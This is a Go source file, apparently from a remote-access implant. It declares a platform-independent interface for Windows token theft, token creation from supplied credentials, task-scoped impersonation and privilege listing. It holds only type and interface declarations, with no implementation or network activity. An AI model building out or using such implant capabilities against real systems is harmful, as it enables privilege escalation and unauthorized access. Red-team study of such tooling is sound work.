// Package token exposes the Windows token operations used by the implant's
// privilege tasks. Builds for other platforms compile the same interface and
// return ErrUnsupported, so the task registry stays platform-independent.
package token

import (
	"errors"
	"time"
)

// ErrUnsupported is returned by every operation on a non-Windows build.
var ErrUnsupported = errors.New("token operations require Windows")

// Info describes a token known to the implant.
type Info struct {
	ID        string    `json:"id"`
	PID       int       `json:"pid,omitempty"`
	User      string    `json:"user,omitempty"`
	Kind      string    `json:"kind"` // current, stolen, made
	CreatedAt time.Time `json:"created_at,omitempty"`
}

// Privilege is one entry of a process token's privilege list.
type Privilege struct {
	Name    string `json:"name"`
	Enabled bool   `json:"enabled"`
}

// Manager owns the tokens stolen or created during this implant's lifetime.
// Impersonation is deliberately task-scoped: Impersonate applies the token to
// a locked OS thread, reports the effective identity, and reverts before the
// task returns. A later task can therefore never inherit an impersonation by
// accident. Handles are closed by Revert or Close.
type Manager interface {
	List() ([]Info, error)
	Steal(pid int) (Info, error)
	Make(username, password, domain, logonType string) (Info, error)
	Impersonate(id string) (Info, error)
	Revert() (int, error)
	Privileges() ([]Privilege, error)
	Close() error
}

// NewManager returns the platform token manager.
func NewManager() Manager { return newPlatformManager() }
